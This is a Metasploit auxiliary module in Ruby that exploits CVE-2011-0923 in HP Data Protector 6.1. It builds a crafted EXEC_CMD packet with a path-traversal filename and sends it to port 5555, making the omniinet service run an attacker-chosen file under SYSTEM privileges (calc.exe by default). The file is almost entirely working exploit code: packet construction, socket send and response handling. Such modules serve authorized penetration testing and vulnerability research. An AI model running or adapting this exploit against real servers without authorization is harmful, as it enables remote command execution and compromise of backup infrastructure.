##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'HP Data Protector 6.1 EXEC_CMD Command Execution',
      'Description'    => %q{
        This module exploits HP Data Protector's omniinet process, specifically
        against a Windows setup.

        When an EXEC_CMD packet is sent, omniinet.exe will attempt to look
        for that user-supplied filename with kernel32!FindFirstFileW().  If the file
        is found, the process will then go ahead execute it with CreateProcess()
        under a new thread.  If the filename isn't found, FindFirstFileW() will throw
        an error (0x03), and then bails early without triggering CreateProcess().

        Because of these behaviors, if you try to supply an argument, FindFirstFileW()
        will look at that as part of the filename, and then bail.

        Please note that when you specify the 'CMD' option, the base path begins
        under C:\.
      },
      'References'     =>
        [
          [ 'CVE', '2011-0923' ],
          [ 'OSVDB', '72526' ],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-055/' ],
          [ 'URL', 'http://c4an-dl.blogspot.com/hp-data-protector-vuln.html' ],
          [ 'URL', 'http://hackarandas.com/blog/2011/08/04/hp-data-protector-remote-shell-for-hpux' ]
        ],
      'Author'         =>
        [
          'ch0ks',     # poc
          'c4an',      # msf poc (linux)
          'wireghoul', # Improved msf (linux)
          'sinn3r'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Feb 7 2011"
    ))

    register_options(
      [
        Opt::RPORT(5555),
        OptString.new("CMD", [true, 'File to execute', 'Windows\System32\calc.exe'])
      ], self.class)
  end


  def run
    cmd = datastore['CMD']
    cmd << "\x00"*25
    cmd << "\n"

    user = Rex::Text.rand_text_alpha(4)

    packet = "\x00\x00\x00\xa4\x20\x32\x00\x20"
    packet << user*2
    packet << "\x00\x20\x30\x00\x20"
    packet << "SYSTEM"
    packet << "\x00\x20\x63\x34\x61\x6e"
    packet << "\x20\x20\x20\x20\x20\x00\x20\x43\x00\x20\x32\x30\x00\x20"
    packet << user
    packet << "\x20\x20\x20\x20\x00\x20"
    packet << "\x50\x6f\x63"
    packet << "\x00\x20"
    packet << "NTAUTHORITY"
    packet << "\x00\x20"
    packet << "NTAUTHORITY"
    packet << "\x00\x20"
    packet << "NTAUTHORITY"
    packet << "\x00\x20\x30\x00\x20\x30\x00\x20"
    packet << "../../../../../../../../../../"
    packet << cmd

    begin
      print_status("#{rhost}:#{rport} - Sending command...")
      connect
      sock.put(packet)
      res = sock.get_once
      print_status(res.to_s) if res and not res.empty?
    rescue
      print_error("#{rhost}:#{rport} - Unable to connect")
    ensure
      disconnect
    end
  end

end
